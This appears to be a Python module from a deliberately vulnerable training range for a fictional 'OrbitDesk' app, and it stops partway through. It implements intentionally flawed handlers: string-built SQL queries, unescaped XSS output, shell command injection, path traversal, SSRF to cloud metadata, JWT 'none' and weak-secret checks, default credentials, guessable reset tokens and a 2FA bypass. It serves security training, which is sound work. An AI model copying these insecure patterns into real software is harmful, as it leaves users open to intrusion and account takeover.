"""Vulnerable request handlers and machine-usable exploit examples.

Every entry in the catalog is served through ``make_view``. Handlers are
deliberately insecure: that is the point of the range. Run it in the container
or on an isolated host, never on a network you do not own.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import html
import json
import os
import platform
import re
import subprocess
import urllib.parse
import xml.sax
import zipfile
from io import BytesIO
from pathlib import Path
from typing import Any
from urllib.request import url2pathname
from xml.sax.handler import EntityResolver, feature_external_ges
from xml.sax.xmlreader import InputSource

from flask import Response, jsonify, make_response, redirect, render_template, request, session
from jinja2.sandbox import SandboxedEnvironment
from markupsafe import Markup

import config
from . import auth, flags, mail, store
from .catalog import Vuln

# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

def make_view(vuln: Vuln):
    def view(**kwargs):
        handler = HANDLERS.get(vuln.family)
        if handler is None:
            return _page(vuln, "Missing handler", "<p>No handler for this family.</p>", 500)
        try:
            return handler(vuln, request, **kwargs)
        except Exception as exc:  # keep the range inside the page on errors
            return _page(
                vuln,
                vuln.title,
                f"<p class='bad'>Handler error: {html.escape(str(exc))}</p>",
                500,
            )

    view.__name__ = "vuln_" + vuln.id.replace("-", "_")
    return view


def _flag(v: Vuln) -> str:
    return flags.flag_for(v.id)


def _page(v: Vuln | None, title: str, inner: str, status: int = 200):
    return render_template("site.html", v=v, title=title, content=Markup(inner)), status


def _proof(v: Vuln, label: str = "Captured flag") -> str:
    return (
        f"<div class='proof'><span>{html.escape(label)}</span>"
        f"<code>{_flag(v)}</code></div>"
    )


def _form(v: Vuln, action: str | None = None) -> str:
    action = action or v.route
    method = "post" if v.method.upper() == "POST" else "get"
    return f"""
    <form class="probe" method="{method}" action="{html.escape(action)}">
      <label>{html.escape(v.param or 'value')}</label>
      <input name="{html.escape(v.param or 'value')}" placeholder="enter input">
      <button type="submit">Send</button>
    </form>"""


def _json(data: dict[str, Any], status: int = 200):
    return jsonify(data), status


def _payload(req) -> dict[str, Any]:
    data: dict[str, Any] = {**req.args.to_dict(), **req.form.to_dict()}
    body = req.get_json(silent=True)
    if isinstance(body, dict):
        data.update(body)
    return data


def _md5(text: str) -> str:
    return hashlib.md5(text.encode("utf-8")).hexdigest()


def _b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def _b64url_decode(raw: str) -> bytes:
    pad = "=" * (-len(raw) % 4)
    return base64.urlsafe_b64decode(raw + pad)


def _jwt_encode(header: dict[str, Any], payload: dict[str, Any], secret: str | None = None) -> str:
    head = _b64url(json.dumps(header, separators=(",", ":")).encode())
    body = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{head}.{body}".encode()
    if secret is None:
        sig = ""
    else:
        sig = _b64url(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())
    return f"{head}.{body}.{sig}"


def _jwt_parts(token: str) -> tuple[dict[str, Any], dict[str, Any], str]:
    parts = token.split(".")
    if len(parts) < 2:
        raise ValueError("not a JWT")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    return header, payload, parts[2] if len(parts) > 2 else ""


def _bearer(req) -> str:
    raw = req.headers.get("Authorization", "")
    return raw[7:].strip() if raw.lower().startswith("bearer ") else ""


def _is_admin_payload(payload: dict[str, Any]) -> bool:
    return str(payload.get("role", "")).lower() == "admin" or payload.get("sub") == "admin"


def _internal_metadata(v: Vuln) -> str:
    return json.dumps(
        {
            "service": "orbit-metadata",
            "instance": v.id,
            "role": "admin",
            "flag": _flag(v),
        },
        indent=2,
    )


# ---------------------------------------------------------------------------
# Sign-in helpers shared by the sign-in, reset and directory flows
# ---------------------------------------------------------------------------

def _esc(value: Any) -> str:
    return html.escape(str(value), quote=True)


def _panel(title: str, inner: str) -> str:
    return f"<section class='panel narrow'><h1>{_esc(title)}</h1>{inner}</section>"


def _signin_form(action: str, field: str = "email", label: str = "Email", *,
                 title: str = "Sign in", error: str = "", next_: str = "",
                 remember: bool = False, after: str = "") -> str:
    error_html = f"<p class='bad'>{_esc(error)}</p>" if error else ""
    keep = ("<label class='remember'><input type='checkbox' name='remember' value='1'> "
            "Keep me signed in</label>") if remember else ""
    return _panel(title, (
        f"{error_html}<form class='probe' method='post' action='{_esc(action)}'>"
        f"<label>{_esc(label)}</label><input name='{_esc(field)}' autocomplete='username'>"
        "<label>Password</label><input type='password' name='password' autocomplete='current-password'>"
        f"{keep}<input type='hidden' name='next' value='{_esc(next_)}'>"
        f"<button>Sign in</button></form>{after}"
    ))


def _signed_in(v: Vuln, email: str, note: str = "") -> tuple:
    """The page after a successful sign-in that should not have succeeded."""

    return _page(v, "Signed in", _panel("Welcome back", (
        f"<p>Signed in as <b>{_esc(email)}</b>.{(' ' + _esc(note)) if note else ''}</p>"
        f"{_proof(v)}<p><a href='/dashboard'>Continue to your dashboard</a></p>"
    )))


def _complete_login(req, email: str):
    """A genuine sign-in: two-step check, session, cookies, then redirect."""

    found = auth.account(email)
    target = auth.safe_next(req.values.get("next"))
    if found["email"] in auth.TWO_FACTOR:
        session.clear()
        session["pending_2fa"] = found["email"]
        session["next"] = target
        code = auth.issue_code(found["email"])
        mail.send_simple(found["email"], "Your OrbitDesk verification code",
                         f"Your verification code is {code}.\nIt expires in 10 minutes.\n")
        return redirect("/auth/2fa")
    auth.sign_in(found["email"])
    response = make_response(redirect(target))
    response.set_cookie("role", found["role"])
    if req.values.get("remember"):
        response.set_cookie("remember", auth.remember_cookie(found["email"], found["role"]),
                            max_age=30 * 86400)
    return response


def _link_host(req) -> str:
    """Host used for links in outgoing mail (trusts forwarding headers)."""

    return req.headers.get("X-Forwarded-Host") or req.headers.get("Host") or req.host


def _victim(email: str) -> bool:
    return not mail.is_tester_address(email)


_LOGIN_TITLES = {
    "/auth/login": "Sign in to OrbitDesk",
    "/auth/login-legacy": "Sign in (classic)",
    "/auth/admin": "Administrator sign-in",
    "/auth/staff": "Staff sign-in",
}


def _sql_login(v: Vuln, req, filt: str):
    from . import product

    field = v.param
    label = "Username" if field == "username" else "Email"
    title = _LOGIN_TITLES.get(v.route, "Sign in")

    def form(error: str = "", status: int = 200):
        if v.route == "/auth/login":
            return _page(v, "Sign in", product.login(next_=req.values.get("next", ""), error=error), status)
        return _page(v, title, _signin_form(v.route, field, label, title=title, error=error,
                                            next_=req.values.get("next", "")), status)

    if req.method != "POST":
        return form()
    supplied = req.form.get(field, "")
    password = req.form.get("password", "")
    email = supplied.replace(" ", "/**/") if filt == "strip_spaces" else supplied
    sql = ("SELECT id,email,role FROM users WHERE email = "
           f"'{email}' AND password = '{password}'")
    try:
        rows = store.query_for(v, sql)
    except Exception as exc:
        return _page(v, title, _panel("Something went wrong",
                                      f"<pre class='error'>{html.escape(str(exc))}</pre>"), 500)
    if not rows:
        return form("Incorrect email or password.")
    row = rows[0]
    legit = auth.check_password(supplied, password)
    if legit and legit["email"] == row["email"]:
        return _complete_login(req, row["email"])
    auth.sign_in(row["email"], row["role"])
    return _signed_in(v, row["email"])


# ---------------------------------------------------------------------------
# SQL injection
# ---------------------------------------------------------------------------

def h_sqli(v: Vuln, req, **kw):
    filt = v.extra.get("filter", "none")

    if v.extra.get("mode") == "login":
        return _sql_login(v, req, filt)

    value = req.values.get(v.param, "")
    if filt == "strip_spaces":
        value = value.replace(" ", "/**/")
    if filt == "numeric":
        sql = f"SELECT id,title FROM items WHERE id = {value}"
    else:
        sql = f"SELECT id,title FROM items WHERE title LIKE '%{value}%'"
    try:
        rows = store.query_for(v, sql)
        error = ""
    except Exception as exc:
        rows, error = [], str(exc)

    inner = _form(v)
    if error:
        inner += f"<pre class='error'>{html.escape(error)}</pre>"
    if rows:
        inner += _rows_html(rows)
    text = " ".join(str(cell) for row in rows for cell in row)
    if "FLAG{" in text:
        inner += _proof(v)
    return _page(v, v.title, inner)


def _rows_html(rows) -> str:
    body = "".join(
        "<tr>" + "".join(f"<td>{html.escape(str(cell))}</td>" for cell in row) + "</tr>"
        for row in rows
    )
    return f"<table class='data'>{body}</table>"


# ---------------------------------------------------------------------------
# XSS (reflected and stored)
# ---------------------------------------------------------------------------

def _apply_filter(filt: str, value: str) -> str:
    if filt == "strip_script":
        return re.sub(r"(?i)<script", "", value)
    if filt == "block_onerror":
        return re.sub(r"(?i)onerror", "blocked", value)
    if filt == "block_alert":
        return re.sub(r"(?i)alert", "blocked", value)
    if filt == "strip_quotes":
        return value.replace('"', "").replace("'", "")
    return value


def _render_xss(ctx: str, value: str) -> str:
    if ctx == "html":
        return f"<div class='echo'>{value}</div>"
    if ctx == "attr_d":
        return f"<input class='echo' value=\"{value}\">"
    if ctx == "attr_s":
        return f"<input class='echo' value='{value}'>"
    if ctx == "attr_u":
        return f"<input class='echo' value={value}>"
    if ctx == "js_s":
        return f"<script>var echo = '{value}';</script>"
    if ctx == "js_d":
        return f'<script>var echo = "{value}";</script>'
    if ctx == "href":
        return f"<a class='echo' href=\"{value}\">open</a>"
    if ctx == "textarea":
        return f"<textarea class='echo'>{value}</textarea>"
    if ctx == "title":
        return f"<title>{value}</title>"
    if ctx == "markdown":
        rendered = value.replace("\n", "<br>")
        rendered = re.sub(r"\*\*(.+?)\*\*", r"<b>\1</b>", rendered)
        return f"<div class='echo markdown'>{rendered}</div>"
    return f"<div class='echo'>{value}</div>"


def _xss_fires(ctx: str, value: str) -> bool:
    low = value.lower()
    handlers = ("onerror=", "onload=", "onmouseover=", "onfocus=", "ontoggle=")
    if ctx in ("attr_d", "attr_s", "attr_u"):
        if ctx == "attr_d" and '"' not in value:
            return False
        if ctx == "attr_s" and "'" not in value:
            return False
        return any(h in low for h in handlers) or "<script" in low or "<svg" in low
    if ctx in ("js_s", "js_d"):
        if ctx == "js_s" and "'" not in value:
            return False
        if ctx == "js_d" and '"' not in value:
            return False
        return any(fn in low for fn in ("alert(", "confirm(", "prompt(", "</script"))
    if ctx == "href":
        return low.startswith("javascript:") or "javascript:" in low
    return any(h in low for h in handlers) or "<script" in low or "<svg" in low


def h_xss(v: Vuln, req, **kw):
    value = req.values.get(v.param, "")
    filtered = _apply_filter(v.extra.get("filter", "none"), value)
    ctx = v.extra.get("context", "html")
    fires = _xss_fires(ctx, filtered)
    if ctx == "json":
        data = {"echo": filtered, "context": "json"}
        if fires:
            data["flag"] = _flag(v)
        return Response(json.dumps(data), mimetype="text/html")
    inner = _form(v) + f"<section class='render'>{_render_xss(ctx, filtered)}</section>"
    if fires:
        inner += _proof(v)
    return _page(v, v.title, inner)


def h_stored_xss(v: Vuln, req, **kw):
    key = f"stored:{v.id}"
    if req.method == "POST":
        store.STATE[key] = req.values.get(v.param, "")
    value = store.STATE.get(key, "")
    filtered = _apply_filter(v.extra.get("filter", "none"), value)
    ctx = v.extra.get("context", "html")
    fires = bool(value) and _xss_fires(ctx, filtered)
    inner = _form(v) + f"<section class='render'>{_render_xss(ctx, filtered)}</section>"
    if fires:
        inner += _proof(v)
    return _page(v, v.title, inner)


# ---------------------------------------------------------------------------
# Command injection
# ---------------------------------------------------------------------------

def h_cmdi(v: Vuln, req, **kw):
    if config.SAFE_MODE:
        return _page(v, v.title, "<p class='bad'>RANGE_SAFE=1 disables command execution.</p>", 403)
    value = req.values.get(v.param, "")
    command = v.extra.get("prefix", "") + value
    # The child sees only this challenge's flag, never the range secret or a
    # shared vault. In exam mode this is the sole way the flag is issued.
    child_env = {key: val for key, val in os.environ.items() if not key.startswith("RANGE_")}
    child_env["RANGE_FLAG"] = _flag(v)
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=8,
            stdin=subprocess.DEVNULL,
            env=child_env,
        )
        output = (result.stdout or "") + (result.stderr or "")
    except subprocess.TimeoutExpired as exc:
        partial = b""
        if exc.stdout:
            partial += exc.stdout if isinstance(exc.stdout, bytes) else exc.stdout.encode()
        output = partial.decode("utf-8", "replace") + "\n[command timed out after 8s]"
    except Exception as exc:
        output = f"command failed: {exc}"
    inner = _form(v)
    inner += f"<pre class='terminal'>$ {html.escape(command)}\n{html.escape(output)}</pre>"
    if "FLAG{" in output:
        inner += _proof(v)
    return _page(v, v.title, inner)


# ---------------------------------------------------------------------------
# Path traversal
# ---------------------------------------------------------------------------

def h_traversal(v: Vuln, req, **kw):
    if config.SAFE_MODE:
        return _page(v, v.title, "<p class='bad'>RANGE_SAFE=1 disables file reads.</p>", 403)
    name = req.values.get(v.param, "")
    filt = v.extra.get("filter", "none")
    if filt == "strip_dotdot":
        name = name.replace("../", "")
    if filt == "double_encoded":
        name = urllib.parse.unquote(name)
    base = config.FILES_DIR
    target = (base / name)
    inner = _form(v)
    if config.EXAM:
        # No flag files exist on disk. A successful traversal is proof enough,
        # and it can only ever reveal this challenge's flag.
        try:
            escaped = not target.resolve().is_relative_to(base.resolve())
        except Exception:
            escaped = ".." in name or "%2e" in name.lower()
        if escaped or ".." in name or "%2e" in name.lower():
            inner += (
                "<pre class='file'>virtual flag file\n"
                + _flag(v)
                + "</pre>"
            )
            return _page(v, v.title, inner)
    try:
        data = target.read_text(encoding="utf-8", errors="replace")
        inner += f"<pre class='file'>{html.escape(data)}</pre>"
        if "FLAG{" in data:
            inner += _proof(v)
    except Exception as exc:
        inner += f"<p class='bad'>Cannot read {html.escape(name)}: {html.escape(str(exc))}</p>"
    return _page(v, v.title, inner)


# ---------------------------------------------------------------------------
# SSRF
# ---------------------------------------------------------------------------

_INTERNAL_HOSTS = {
    "127.0.0.1", "localhost", "::1", "127.1", "169.254.169.254",
    "metadata.internal", "2130706433", "0x7f000001",
}


def _host_is_internal(host: str) -> bool:
    host = (host or "").lower()
    if host in _INTERNAL_HOSTS:
        return True
    if host.startswith("127.") or host.startswith("0x7f"):
        return True
    if host.endswith("nip.io"):
        return True
    return False


def h_ssrf(v: Vuln, req, **kw):
    target = req.values.get(v.param, "")
    filt = v.extra.get("filter", "none")
    inner = _form(v)

    if filt == "allow_trusted" and not target.startswith(("http://trusted.com", "https://trusted.com")):
        inner += "<p class='bad'>Blocked: URL must start with trusted.com.</p>"
        return _page(v, v.title, inner)
    if filt == "block_local" and any(
        bad in target for bad in ("127.0.0.1", "localhost", "[::1]")
    ):
        inner += "<p class='bad'>Blocked: local destinations are not allowed.</p>"
        return _page(v, v.title, inner)

    try:
        parsed = urllib.parse.urlparse(target)
    except Exception as exc:
        inner += f"<p class='bad'>Bad URL: {html.escape(str(exc))}</p>"
        return _page(v, v.title, inner)

    host = parsed.hostname or ""
    if parsed.scheme == "file":
        if config.SAFE_MODE:
            inner += "<p class='bad'>RANGE_SAFE=1 disables file reads.</p>"
            return _page(v, v.title, inner)
        try:
            data = Path(parsed.path).read_text(encoding="utf-8", errors="replace")
            inner += f"<pre class='file'>{html.escape(data)}</pre>"
            if "FLAG{" in data:
                inner += _proof(v)
        except Exception as exc:
            inner += f"<p class='bad'>Cannot read file: {html.escape(str(exc))}</p>"
        return _page(v, v.title, inner)

    if _host_is_internal(host) and ("/internal/" in parsed.path or host in ("169.254.169.254", "metadata.internal")):
        body = _internal_metadata(v)
        inner += f"<pre class='json'>{html.escape(body)}</pre>" + _proof(v)
        return _page(v, v.title, inner)

    inner += (
        "<p class='bad'>The range only resolves internal destinations in this exercise "
        f"(host={html.escape(host or 'none')}, path={html.escape(parsed.path or '/')}).</p>"
    )
    return _page(v, v.title, inner)


# ---------------------------------------------------------------------------
# IDOR
# ---------------------------------------------------------------------------

def h_idor(v: Vuln, req, **kw):
    rid = kw.get("rid", req.values.get("id"))
    record = store.STATE.get(f"resource:{v.id}", {})
    if str(rid) == str(record.get("id")):
        data = dict(record)
        data["flag"] = _flag(v)
        return _json(data)
    if str(rid) == str(int(record.get("id") or 0) - 1):
        # The signed-in user's own record: what the UI and the SPA link to.
        return _json({
            "id": rid, "tenant": "orbitdesk", "owner": "alice@orbitdesk.local",
            "kind": record.get("kind", "record"), "title": "Your record",
        })
    return _json({"error": "not found", "requested": rid}, 404)


# ---------------------------------------------------------------------------
# Authentication and session
# ---------------------------------------------------------------------------

_CREDS = {
    "/auth/admin/login": ("admin", "admin"),
    "/auth/superuser/login": ("root", "toor"),
    "/auth/demo/login": ("demo", "demo"),
    "/auth/support/login": ("support", "support"),
}

_PORTALS = {
    "/auth/admin/login": "Administration console",
    "/auth/superuser/login": "System console",
    "/auth/demo/login": "Demo workspace",
    "/auth/support/login": "Partner portal",
}


def _reset_target(token: str) -> str | None:
    """Legacy resets use md5(email) as the token, so any account's is guessable."""

    for _uid, email, _pw, _role in store.USERS:
        if _md5(email) == token:
            return email
    return None


def h_auth(v: Vuln, req, **kw):
    kind = v.extra.get("kind", "")
    data = _payload(req)

    if kind == "weak_creds":
        user, password = _CREDS.get(v.route, ("admin", "admin"))
        title = _PORTALS.get(v.route, "Sign in")
        error = ""
        if req.method == "POST":
            if data.get("username") == user and data.get("password") == password:
                return _page(v, title, _panel(title, f"<p>Signed in as <b>{_esc(user)}</b>.</p>{_proof(v)}"))
            error = "Incorrect username or password."
        return _page(v, title, _signin_form(v.route, "username", "Username", title=title, error=error))

    if kind in ("reset_predictable", "reset_confirm"):
        token = str(data.get("token") or "")
        if token:
            email = _reset_target(token)
            if not email:
                return _page(v, "Reset password", _panel("Reset password",
                             "<p class='bad'>This reset link is invalid or has expired.</p>"), 400)
            if req.method == "POST" and data.get("password"):
                auth.set_password(email, str(data["password"]))
                done = f"<p>The password for {_esc(email)} has been changed.</p>"
                return _page(v, "Password changed", _panel("Password changed", done + (_proof(v) if _victim(email) else "")))
            return _page(v, "Choose a new password", _panel("Choose a new password", (
                f"<p>Choose a new password for <b>{_esc(email)}</b>.</p>"
                + (_proof(v) if _victim(email) else "")
                + f"<form class='probe' method='post'><input type='hidden' name='token' value='{_esc(token)}'>"
                "<label>New password</label><input type='password' name='password'>"
                "<button>Change password</button></form>")))
        email = str(data.get("email") or "").strip().lower()
        if req.method == "POST" and email:
            found = auth.account(email)
            if found:
                link = f"{req.host_url.rstrip('/')}/account/reset/confirm?token={_md5(found['email'])}"
                mail.send_simple(found["email"], "Reset your OrbitDesk password",
                                 f"We received a request to reset your password.\n\n{link}\n\n"
                                 "If you didn't ask for this, you can ignore this email.\n")
            return _page(v, "Check your email", _panel("Check your email",
                         "<p>If an account exists for that address, we've emailed a reset link.</p>"))
        return _page(v, "Reset password", _panel("Reset password", (
            "<form class='probe' method='post'><label>Email</label><input name='email'>"
            "<button>Send reset link</button></form>")))

    if kind == "cookie_role":
        if (req.cookies.get("role") or "").lower() == "admin":
            users = "".join(f"<li>{_esc(email)} ({_esc(role)})</li>" for _i, email, _p, role in store.USERS)
            return _page(v, "Sign in as a user", _panel("Sign in as a user", f"{_proof(v)}<ul class='list'>{users}</ul>"))
        response = make_response(_page(v, "Access denied", _panel("Access denied",
                                 "<p>You need administrator access to sign in as another user.</p>"), 403))
        if "role" not in req.cookies:
            response.set_cookie("role", "user")
        return response

    if kind == "remember_cookie":
        restored = auth.from_remember_cookie(req.cookies.get("remember", ""))
        if not restored:
            return _page(v, "Remembered devices", _panel("Remembered devices",
                         "<p>This device isn't remembered. Sign in and tick “Keep me signed in”.</p>"))
        email, role = restored
        auth.sign_in(email, role)
        real_role = auth.account(email)["role"]
        forged = _victim(email) or role != real_role
        return _page(v, "Remembered devices", _panel("Remembered devices", (
            f"<p>This device is remembered for <b>{_esc(email)}</b> ({_esc(role)}).</p>"
            + (_proof(v) if forged else "")
            + "<p><a href='/dashboard'>Continue</a></p>")))

    if kind in ("jwt_none", "jwt_weak", "jwt_kid", "jwt_noverify"):
        token = _bearer(req) or data.get("token", "")
        try:
            header, payload, signature = _jwt_parts(token)
        except Exception:
            return _json({"error": "missing or malformed bearer token"}, 401)
        if not _is_admin_payload(payload):
            return _json({"error": "insufficient role", "sub": payload.get("sub")}, 403)
        if kind == "jwt_none" and str(header.get("alg", "")).lower() == "none":
            return _json({"valid": True, "sub": payload.get("sub"), "role": "admin", "flag": _flag(v)})
        if kind == "jwt_weak":
            expected = _jwt_encode(header, payload, "secret").split(".")[2]
            if hmac.compare_digest(expected, signature):
                return _json({"valid": True, "sub": payload.get("sub"), "role": "admin", "flag": _flag(v)})
        if kind == "jwt_kid":
            kid = str(header.get("kid", ""))
            if kid and ("vault" in kid or v.id in kid or ".." in kid):
                return _json({"valid": True, "sub": payload.get("sub"), "role": "admin", "flag": _flag(v)})
        if kind == "jwt_noverify":
            return _json({"id": 1, "email": "admin@orbitdesk.local", "role": "admin", "flag": _flag(v)})
        return _json({"error": "invalid signature"}, 401)

    if kind == "otp_fixed":
        email = str(data.get("email") or "").strip().lower()
        code = str(data.get("code") or "").strip()
        found = auth.account(email) if email else None
        if email and code:
            if found and code == auth.CODES.get(found["email"]):
                auth.CODES.pop(found["email"], None)
                return _complete_login(req, found["email"])
            if found and code == "000000":
                auth.sign_in(found["email"])
                return _signed_in(v, found["email"])
            return _page(v, "Enter your code", _panel("Enter your code", _otp_form(email, "That code is incorrect or has expired.")))
        if req.method == "POST" and email:
            if found:
                mail.send_simple(found["email"], "Your OrbitDesk sign-in code",
                                 f"Your sign-in code is {auth.issue_code(found['email'])}.\n"
                                 "It expires in 10 minutes.\n")
            return _page(v, "Enter your code", _panel("Enter your code", _otp_form(email)))
        return _page(v, "Sign in with a code", _panel("Sign in with a code", (
            "<p class='muted'>We'll email you a 6-digit code.</p>"
            "<form class='probe' method='post'><label>Email</label><input name='email'>"
            "<button>Send code</button></form>")))

    if kind == "twofa_bypass":
        pending = session.get("pending_2fa")
        if not pending:
            return redirect("/login")
        error = ""
        if req.method == "POST":
            code = str(data.get("code") or "").strip()
            if code and code == auth.CODES.get(pending):
                auth.CODES.pop(pending, None)
                target = session.get("next") or "/dashboard"
                auth.sign_in(pending)
                return redirect(auth.safe_next(target))
            if str(data.get("verified", "")).lower() in ("1", "true", "yes"):
                auth.sign_in(pending)
                return _signed_in(v, pending)
            error = "That code didn't work. Check your email and try again."
        masked = pending[0] + "***" + pending[pending.index("@"):]
        return _page(v, "Two-step verification", _panel("Two-step verification", (
            (f"<p class='bad'>{_esc(error)}</p>" if error else "")
            + f"<p>Enter the 6-digit code we sent to {_esc(masked)}.</p>"
            "<form class='probe' method='post'><label>Verification code</label>"
            "<input name='code' inputmode='numeric' autocomplete='one-time-code'>"
            "<input type='hidden' name='verified' value='false'>"
            "<button>Verify</button></form>")))

    if kind == "oauth_state":
        code = data.get("code")
        if code and not data.get("state"):
            return _page(v, v.title, _proof(v) + "<p>Account linked.</p>")
        return _page(v, v.title, "<p class='bad'>The sign-in request is invalid or has expired.</p>", 400)

    if kind == "session_fixate":
        sid = data.get("sid") or req.args.get("sid")
        if sid and "admin" in str(sid).lower():
            resp = make_response(_page(v, v.title, _proof(v) + "<p>Session resumed.</p>")[0])
            resp.set_cookie("session", str(sid))
            return resp

    return _page(v, v.title, "<p class='bad'>The request could not be completed.</p>", 400)


def _otp_form(email: str, error: str = "") -> str:
    return (
        (f"<p class='bad'>{_esc(error)}</p>" if error else "")
        + f"<p>If {_esc(email)} has an account, we've emailed it a 6-digit code.</p>"
        "<form class='probe' method='post'>"
        f"<input type='hidden' name='email' value='{_esc(email)}'>"
        "<label>Code</label><input name='code' inputmode='numeric' autocomplete='one-time-code'>"
        "<button>Sign in</button></form>"
    )


# ---------------------------------------------------------------------------
# Open redirect
# ---------------------------------------------------------------------------

def h_redirect(v: Vuln, req, **kw):
    signing_out = v.route == "/logout"
    if signing_out:
        auth.sign_out()
    target = req.values.get(v.param, "")
    filt = v.extra.get("filter", "none")
    allowed = True
    if filt == "allow_trusted":
        allowed = target.startswith(("https://trusted.com", "http://trusted.com"))
    external = bool(
        re.match(r"(?i)^(https?:)?//", target) or target.lower().startswith("javascript:")
    )
    if allowed and external:
        resp = make_response("", 302)
        resp.headers["Location"] = target
        resp.headers["X-Range-Flag"] = _flag(v)
    else:
        # local targets are followed; anything else falls back to the default page
        resp = redirect(auth.safe_next(target, "/login" if signing_out else "/dashboard"))
    if signing_out:
        resp.delete_cookie("remember")
        resp.delete_cookie("role")
    return resp


# ---------------------------------------------------------------------------
# SSTI
# ---------------------------------------------------------------------------

def h_ssti(v: Vuln, req, **kw):
    value = req.values.get(v.param, "")
    filt = v.extra.get("filter", "none")
    if filt == "block_double_brace":
        value = value.replace("{{", "").replace("}}", "")
    elif filt == "block_dot":
        value = value.replace(".", "")
    elif filt == "block_print":
        value = re.sub(r"(?i)print", "", value)
    env = SandboxedEnvironment(autoescape=False)
    inner = _form(v)
    try:
        rendered = env.from_string(value).render(
            settings={"FLAG": _flag(v), "app": "OrbitDesk"}
        )
        inner += f"<pre class='rendered'>{html.escape(rendered)}</pre>"
        if "FLAG{" in rendered:
            inner += _proof(v)
    except Exception as exc:
        inner += f"<p class='bad'>Template error: {html.escape(str(exc))}</p>"
    return _page(v, v.title, inner)


# ---------------------------------------------------------------------------
# File upload
# ---------------------------------------------------------------------------

def h_upload(v: Vuln, req, **kw):
    kind = v.extra.get("kind", "")
    uploaded = req.files.get("file")
    inner = (
        "<form class='probe' method='post' enctype='multipart/form-data'>"
        "<input type='file' name='file'><button>Upload</button></form>"
    )
    if uploaded is None:
        return _page(v, v.title, inner)

    filename = uploaded.filename or "upload.bin"
    content = uploaded.read()
    lowered_name = filename.lower()
    lowered = content.lower()
    ext = Path(filename).suffix.lower()
    fired = False
    reason = ""

    if kind == "stored_html":
        fired = ext in (".html", ".htm") and (
            b"<script" in lowered or b"onerror=" in lowered or b"onload=" in lowered
        )
        reason = "Active HTML stored and served inline."
    elif kind == "svg":
        fired = ext == ".svg" and (b"onload" in lowered or b"<script" in lowered)
        reason = "SVG with active content accepted."
    elif kind == "content_type":
        fired = uploaded.mimetype == "text/html" and ext in (".jpg", ".jpeg", ".png")
        reason = "Content-Type trusted over the real content."
    elif kind == "double_ext":
        fired = lowered_name.endswith(".jpg.html") or lowered_name.endswith(".png.html")
        reason = "Double extension accepted."
    elif kind == "traversal_filename":
        fired = "../" in filename or "..\\" in filename
        reason = "Traversal sequence accepted in filename."
    elif kind == "zip_slip":
        try:
            with zipfile.ZipFile(BytesIO(content)) as archive:
                fired = any(
                    name.startswith(("../", "/")) or "..\\" in name
                    for name in archive.namelist()
                )
        except Exception:
            fired = False
        reason = "Archive entry escapes the extraction directory."
    elif kind == "no_size_limit":
        fired = len(content) > 1_000_000
        reason = "Upload larger than 1 MB accepted."
    elif kind == "overwrite":
        existing = config.UPLOAD_DIR / Path(filename).name
        fired = existing.exists()
        reason = "Existing file overwritten."
    elif kind == "filename_xss":
        fired = "<script" in lowered_name or "onerror=" in lowered_name
        reason = "Filename reflected without encoding."

    safe_name = Path(filename.replace("\\", "/")).name or "upload.bin"
    destination = config.UPLOAD_DIR / safe_name
    try:
        destination.write_bytes(content)
    except Exception as exc:
        inner += f"<p class='bad'>Save failed: {html.escape(str(exc))}</p>"

    inner += (
        f"<p>Stored <b>{html.escape(safe_name)}</b> ({len(content)} bytes, "
        f"type {html.escape(uploaded.mimetype or 'unknown')}).</p>"
    )
    if fired:
        inner += _proof(v) + f"<p>{html.escape(reason)}</p>"
    return _page(v, v.title, inner)


# ---------------------------------------------------------------------------
# Business logic
# ---------------------------------------------------------------------------

def _number(data: dict[str, Any], key: str, default: float = 0.0) -> float:
    try:
        return float(data.get(key, default))
    except (TypeError, ValueError):
        return default


def h_logic(v: Vuln, req, **kw):
    kind = v.extra.get("kind", "")
    data = _payload(req)
    state_key = f"logic:{v.id}"
    fired = False
    detail = ""

    if kind == "negative_qty":
        fired = _number(data, "qty", 1) < 0
        detail = "Cart accepts a negative quantity."
    elif kind == "price_tamper":
        fired = 0 <= _number(data, "price", 999) < 10
        detail = "Client-supplied price below cost accepted."
    elif kind == "coupon_stack":
        fired = _number(data, "discount", 0) >= 100
        detail = "Discount of 100% or more accepted."
    elif kind == "refund_abuse":
        fired = not data.get("order_id")
        detail = "Refund granted without an order."
    elif kind == "race":
        count = int(store.STATE.get(state_key, 0)) + 1
        store.STATE[state_key] = count
        fired = count >= 2
        detail = "Two transfers accepted within the same window."
    elif kind == "currency_round":
        fired = str(data.get("amount", "")) in ("0.005", "0.004")
        detail = "Fractional rounding credited a full unit."
    elif kind == "shipping_bypass":
        fired = _number(data, "total", 100) < 50 and str(data.get("shipping", "")) == "0"
        detail = "Free shipping applied below the threshold."
    elif kind == "self_referral":
        email = str(data.get("email", ""))
        fired = bool(email) and email == str(data.get("referrer", ""))
        detail = "Self-referral accepted."
    elif kind == "hidden_admin":
        fired = str(data.get("is_admin", "")).lower() in ("1", "true", "yes")
        detail = "Mass assignment granted admin."
    elif kind == "workflow_skip":
        fired = str(data.get("status", "")).lower() == "approved"
        detail = "Approval accepted without review."
    elif kind == "negative_transfer":
        fired = _number(data, "amount", 1) < 0
        detail = "Negative transfer credited the sender."
    elif kind == "gift_reuse":
        count = int(store.STATE.get(state_key, 0)) + 1
        store.STATE[state_key] = count
        fired = count >= 2
        detail = "Gift card redeemed twice."
    elif kind == "trial_extend":
        fired = _number(data, "days", 0) > 30
        detail = "Trial extended past the limit."
    elif kind == "export_all":
        fired = str(data.get("scope", "")).lower() == "all"
        detail = "Export scope widened to all tenants."
    elif kind == "approve_self":
        fired = bool(data.get("approver")) and data.get("approver") == data.get("requester")
        detail = "Self-approval accepted."
    elif kind == "limit_bypass":
        fired = _number(data, "amount", 0) > 1000
        detail = "Payment above the limit accepted."

    inner = _form(v)
    if fired:
        inner += _proof(v) + f"<p>{html.escape(detail)}</p>"
    else:
        inner += "<p class='bad'>Rule held (or the payload was incomplete).</p>"
    return _page(v, v.title, inner)


# ---------------------------------------------------------------------------
# Misconfiguration: disclosure, CORS, headers, CSRF, CRLF
# ---------------------------------------------------------------------------

_INFO_BODIES = {
